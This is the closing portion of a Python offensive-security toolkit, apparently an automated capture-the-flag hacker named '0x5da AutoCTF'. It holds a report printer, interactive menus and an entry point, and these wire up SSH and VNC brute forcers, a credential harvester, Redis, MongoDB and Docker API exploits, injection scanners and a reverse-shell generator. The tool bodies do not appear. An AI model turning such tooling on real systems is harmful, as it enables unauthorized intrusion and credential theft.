            ctype = c.get("type", "?")
            src = c.get("source", "?")
            val = c.get("value", "?")[:120]
            print(f"    {C.R}●{C.RST} [{C.Y}{ctype}{C.RST}] {C.W}{val}{C.RST}  "
                  f"{C.DIM}(from {src}){C.RST}")

    if report["rce_vectors"]:
        subheader("RCE Vectors")
        for r in report["rce_vectors"]:
            print(f"    {C.R}{C.BOLD}●{C.RST} {r}")

    if report["flags"]:
        subheader("Captured Flags")
        for f in report["flags"]:
            print(f"    {C.G}{C.BOLD}🏴 {f}{C.RST}")

    subheader("Suggested Next Steps")
    steps = []
    if unique_creds:
        steps.append("Use discovered credentials to SSH/login to the target")
    if report["rce_vectors"]:
        steps.append("Exploit RCE vectors for initial shell access")
    steps.append("Run PrivEsc enumerator after gaining shell access")
    steps.append("Generate reverse shell payload with Shell Generator")
    if any("ssh" in str(c.get("type", "")).lower() for c in unique_creds):
        steps.append("SSH into target with discovered credentials")
    for i, s in enumerate(steps, 1):
        print(f"    {C.CY}[{i}]{C.RST} {s}")

    report_file = (f"0x5da_fullhack_{target.replace('.', '_')}_"
                   f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(report_file, "w") as f:
        serializable = dict(report)
        serializable["open_ports"] = [(p, s) for p, s in report["open_ports"]]
        serializable["banners"] = {str(k): str(v)[:200] for k, v in report["banners"].items()}
        json.dump(serializable, f, indent=2, default=str)
    success(f"Full report saved: {report_file}")

    print(f"\n  {C.DIM}Full Auto-Hack by 0x5da ({__aliases__}){C.RST}")
    print(f"  {C.DIM}Integrity: {_0x5da_INTEGRITY}{C.RST}\n")
    return report


# ═══════════════════════════════════════════════════════════════════════════════
#  INTERACTIVE MENU — 0x5da (Toasty / OsintToast / WoahToast)
# ═══════════════════════════════════════════════════════════════════════════════

def get_target():
    """Prompt for target IP/hostname."""
    target = input(f"\n  {C.W}Target IP or hostname:{C.RST} ").strip()
    if not target:
        error("No target provided")
        return None
    return target


def get_url():
    """Prompt for target URL with parameters."""
    url = input(f"\n  {C.W}Target URL (with parameters, e.g. http://target/page?id=1):{C.RST} ").strip()
    if not url:
        error("No URL provided")
        return None
    return url


def menu_recon(target):
    """Reconnaissance sub-menu."""
    while True:
        subheader("Reconnaissance Tools")
        print(f"""
    {C.CY}[1]{C.RST}  TCP Port Scan           {C.CY}[4]{C.RST}  OS Fingerprint
    {C.CY}[2]{C.RST}  UDP Port Scan           {C.CY}[5]{C.RST}  DNS Recon
    {C.CY}[3]{C.RST}  Banner Grab             {C.CY}[6]{C.RST}  Subdomain Enum
    {C.CY}[0]{C.RST}  Back
        """)
        choice = input(f"  {C.CY}[0x5da/recon]>{C.RST} ").strip()
        if choice == "0":
            break
        elif choice == "1":
            ports_input = input(f"  {C.W}Port range (default=top-150, or e.g. 1-1000):{C.RST} ").strip()
            if ports_input and "-" in ports_input:
                start, end = ports_input.split("-")
                ports = list(range(int(start), int(end) + 1))
            else:
                ports = None
            tool_port_scan(target, ports=ports)
        elif choice == "2":
            tool_udp_scan(target)
        elif choice == "3":
            ports_input = input(f"  {C.W}Ports to grab (comma-separated, or Enter for common):{C.RST} ").strip()
            if ports_input:
                port_list = [(int(p.strip()), get_service_name(int(p.strip())))
                             for p in ports_input.split(",")]
            else:
                port_list = tool_port_scan(target)
            if port_list:
                tool_banner_grab(target, port_list)
        elif choice == "4":
            open_ports = tool_port_scan(target)
            if open_ports:
                tool_os_fingerprint(target, open_ports)
        elif choice == "5":
            tool_dns_recon(target)
        elif choice == "6":
            wl = input(f"  {C.W}Wordlist file (Enter for default):{C.RST} ").strip() or None
            tool_subdomain_enum(target, wordlist=wl)


def menu_web(target):
    """Web exploitation sub-menu."""
    while True:
        subheader("Web Exploitation Tools")
        print(f"""
    {C.CY}[1]{C.RST}  Directory Buster        {C.CY}[6]{C.RST}  LFI / Path Traversal
    {C.CY}[2]{C.RST}  Web Recon               {C.CY}[7]{C.RST}  Command Injection
    {C.CY}[3]{C.RST}  Tech Fingerprint        {C.CY}[8]{C.RST}  WordPress Scan
    {C.CY}[4]{C.RST}  SQL Injection Scan      {C.CY}[9]{C.RST}  Credential Harvester
    {C.CY}[5]{C.RST}  XSS Scan                {C.CY}[10]{C.RST} Full Web Scan
    {C.CY}[0]{C.RST}  Back
        """)
        choice = input(f"  {C.CY}[0x5da/web]>{C.RST} ").strip()
        if choice == "0":
            break
        elif choice in ("1", "2", "3", "8", "9", "10"):
            port = input(f"  {C.W}Port (default 80):{C.RST} ").strip()
            port = int(port) if port else 80
            ssl_on = port in (443, 8443)
            if choice == "1":
                tool_dir_buster(target, port=port, ssl_on=ssl_on)
            elif choice == "2":
                tool_web_recon(target, port=port, ssl_on=ssl_on)
            elif choice == "3":
                tool_tech_fingerprint(target, port=port, ssl_on=ssl_on)
            elif choice == "8":
                tool_wp_scan(target, port=port, ssl_on=ssl_on)
            elif choice == "9":
                tool_web_cred_harvest(target, port=port, ssl_on=ssl_on)
            elif choice == "10":
                tool_web_recon(target, port=port, ssl_on=ssl_on)
                tool_tech_fingerprint(target, port=port, ssl_on=ssl_on)
                tool_dir_buster(target, port=port, ssl_on=ssl_on)
                tool_wp_scan(target, port=port, ssl_on=ssl_on)
                tool_web_cred_harvest(target, port=port, ssl_on=ssl_on)
        elif choice in ("4", "5", "6", "7"):
            url = get_url()
            if url:
                if choice == "4":
                    tool_sqli_scan(url)
                elif choice == "5":
                    tool_xss_scan(url)
                elif choice == "6":
                    tool_lfi_scan(url)
                elif choice == "7":
                    tool_cmdi_scan(url)


def menu_network(target):
    """Network exploitation sub-menu."""
    while True:
        subheader("Network & VPS Exploitation Tools")
        print(f"""
    {C.CY}[1]{C.RST}  FTP Exploit             {C.CY}[6]{C.RST}  Redis Exploit
    {C.CY}[2]{C.RST}  SMB Enumerator          {C.CY}[7]{C.RST}  Database Brute+Dump
    {C.CY}[3]{C.RST}  SNMP Enumerator         {C.CY}[8]{C.RST}  MongoDB Exploit
    {C.CY}[4]{C.RST}  SSH Brute Forcer        {C.CY}[9]{C.RST}  Docker API Exploit
    {C.CY}[5]{C.RST}  VNC Brute Forcer        {C.CY}[10]{C.RST} Memcached Dump
    {C.CY}[0]{C.RST}  Back
        """)
        choice = input(f"  {C.CY}[0x5da/network]>{C.RST} ").strip()
        if choice == "0":
            break
        elif choice == "1":
            tool_ftp_check(target)
        elif choice == "2":
            tool_smb_enum(target)
        elif choice == "3":
            tool_snmp_enum(target)
        elif choice == "4":
            tool_ssh_brute(target, delay=0.5)
        elif choice == "5":
            tool_vnc_brute(target)
        elif choice == "6":
            tool_redis_exploit(target)
        elif choice == "7":
            tool_db_brute(target)
        elif choice == "8":
            tool_mongo_exploit(target)
        elif choice == "9":
            tool_docker_exploit(target)
        elif choice == "10":
            tool_memcached_dump(target)


def menu_crypto():
    """Crypto & utilities sub-menu."""
    while True:
        subheader("Crypto & Utility Tools")
        print(f"""
    {C.CY}[1]{C.RST}  Hash Cracker            {C.CY}[4]{C.RST}  PrivEsc Enumerator
    {C.CY}[2]{C.RST}  Crypto Toolkit          {C.CY}[5]{C.RST}  Exploit Matcher
    {C.CY}[3]{C.RST}  Reverse Shell Generator
    {C.CY}[0]{C.RST}  Back
        """)
        choice = input(f"  {C.CY}[0x5da/crypto]>{C.RST} ").strip()
        if choice == "0":
            break
        elif choice == "1":
            h = input(f"  {C.W}Enter hash:{C.RST} ").strip()
            wl = input(f"  {C.W}Wordlist file (Enter for default):{C.RST} ").strip() or None
            if h:
                tool_hash_crack(h, wordlist=wl)
        elif choice == "2":
            tool_crypto_toolkit()
        elif choice == "3":
            tool_shell_generator()
        elif choice == "4":
            local = input(f"  {C.W}Run locally? (y/N):{C.RST} ").strip().lower() == "y"
            tool_privesc_enum(local=local)
        elif choice == "5":
            info("Run a port scan + banner grab first to feed the matcher")
            target = input(f"  {C.W}Target:{C.RST} ").strip()
            if target:
                ports = tool_port_scan(target)
                if ports:
                    banners = tool_banner_grab(target, ports)
                    tool_exploit_matcher(target, banners)


def main_menu():
    """
    0x5da AutoCTF Main Menu — Created by 0x5da (Toasty / OsintToast / WoahToast).
    All code, exploits, and tools in this toolkit are original work by 0x5da.
    """
    print(BANNER)
    target = None

    while True:
        print(f"""
  {C.W}{C.BOLD}{'─' * 60}{C.RST}
  {C.W}{C.BOLD}  0x5da AutoCTF — Main Menu{C.RST}
  {C.W}{C.BOLD}{'─' * 60}{C.RST}
  {C.DIM}  Target: {target or 'Not set'}{C.RST}

    {C.R}{C.BOLD}[1]{C.RST}  {C.R}{C.BOLD}FULL AUTO-HACK{C.RST}         All 30 tools, automatic, everything
    {C.G}[2]{C.RST}  {C.BOLD}Reconnaissance{C.RST}          Port scan, banners, OS, DNS
    {C.G}[3]{C.RST}  {C.BOLD}Web Exploitation{C.RST}        DirBust, SQLi, XSS, LFI, CMDi, WP, Creds
    {C.G}[4]{C.RST}  {C.BOLD}Network & VPS Exploit{C.RST}  FTP, SMB, SSH, Redis, DB, Mongo, Docker, VNC
    {C.CY}[5]{C.RST}  Crypto & Utilities       Hashes, encoding, shells, privesc, exploits
    {C.Y}[6]{C.RST}  Set Target              Change target IP/hostname
    {C.R}[0]{C.RST}  Exit
        """)

        choice = input(f"  {C.CY}[0x5da]>{C.RST} ").strip()

        if choice == "0":
            print(f"\n  {C.DIM}Exiting 0x5da AutoCTF. Stay frosty. — {__built_by__}{C.RST}\n")
            sys.exit(0)
        elif choice == "6":
            target = get_target()
        elif choice == "1":
            if not target:
                target = get_target()
            if target:
                full_auto_hack(target)
        elif choice in ("2", "3", "4"):
            if not target:
                target = get_target()
            if target:
                if choice == "2":
                    menu_recon(target)
                elif choice == "3":
                    menu_web(target)
                elif choice == "4":
                    menu_network(target)
        elif choice == "5":
            menu_crypto()
        else:
            warning("Invalid choice")


# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT — 0x5da AutoCTF (Toasty / OsintToast / WoahToast)
#  All rights reserved. Unauthorized modification prohibited.
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
        print(BANNER)
        print(f"""
  {C.W}{C.BOLD}Usage:{C.RST}
    python3 htb_autoctf.py                     Interactive menu mode
    python3 htb_autoctf.py --auto <IP>         Full Auto-Hack (all 30 tools)
    python3 htb_autoctf.py -h                  Show this help

  {C.W}{C.BOLD}30 Built-In Tools:{C.RST}
    Port Scanner, UDP Scanner, Banner Grabber, OS Fingerprinter,
    DNS Recon, Subdomain Enum, Dir Buster, Web Recon,
    Tech Fingerprinter, SQLi Scanner, XSS Scanner, LFI Scanner,
    CMDi Scanner, WordPress Scanner, FTP Exploit, SMB Enumerator,
    SNMP Enumerator, SSH Brute Forcer, Hash Cracker, Crypto Toolkit,
    Shell Generator, PrivEsc Enumerator, Redis Exploit, DB Brute+Dump,
    MongoDB Exploit, Memcached Dump, Web Credential Harvester,
    Exploit Matcher, Docker API Exploit, VNC Brute Forcer

  {C.W}{C.BOLD}Created by:{C.RST} {__built_by__}
  {C.W}{C.BOLD}Version:{C.RST}    {__version__}
  {C.W}{C.BOLD}Integrity:{C.RST}  {_0x5da_INTEGRITY}

  {C.Y}WARNING: Use only on systems you own or have explicit authorization to test.
  Unauthorized access to computer systems is illegal.{C.RST}
        """)
        sys.exit(0)

    if len(sys.argv) > 2 and sys.argv[1] == "--auto":
        print(BANNER)
        full_auto_hack(sys.argv[2])
    else:
        try:
            main_menu()
        except KeyboardInterrupt:
            print(f"\n\n  {C.DIM}Interrupted. — 0x5da AutoCTF ({__aliases__}){C.RST}\n")
            sys.exit(0)
